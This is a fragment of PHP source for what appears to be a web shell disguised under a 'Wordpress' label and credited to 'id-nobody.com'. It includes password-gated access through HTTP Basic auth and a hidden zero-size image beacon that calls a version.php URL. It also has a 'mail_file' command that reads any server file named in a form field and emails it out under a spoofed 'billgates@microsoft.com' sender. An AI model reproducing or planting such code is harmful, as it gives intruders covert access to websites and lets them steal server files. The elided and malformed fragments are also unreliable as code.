...
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="Privet!"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b><a href=id=nobody.com>Privet!</a> : Access Denied</b>");
   }
}
$head = '<!--                  -->
<html>
...
@print "<img src=\"http://127.0.0.1/Wordpress/version.php?img=1&version=".$current_version."\" border=0 height=0 width=0>";
@readfile ("http://127.0.0.1/Wordpress/version.php?version=".$current_version."");}}
...
<font face=Webdings size=6><b>!</b></font><b>'.ws(2).'Wordpress '.$version.'</b>
...
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 ...
 if(!$file=@fopen($_POST['loc_file'],"r")) { echo re($_POST['loc_file']); $_POST['cmd']=""; }
 else
  {
    ...
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from Wordpress'; }
...
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billgates@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("file from Wordpress"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
...
echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>[ Wordpress - by id-nobody.com. | <a hrefhttp://id-nobody.com</a> | version ".$version." ]</b></font></div></td></tr></table>".$f;
?>
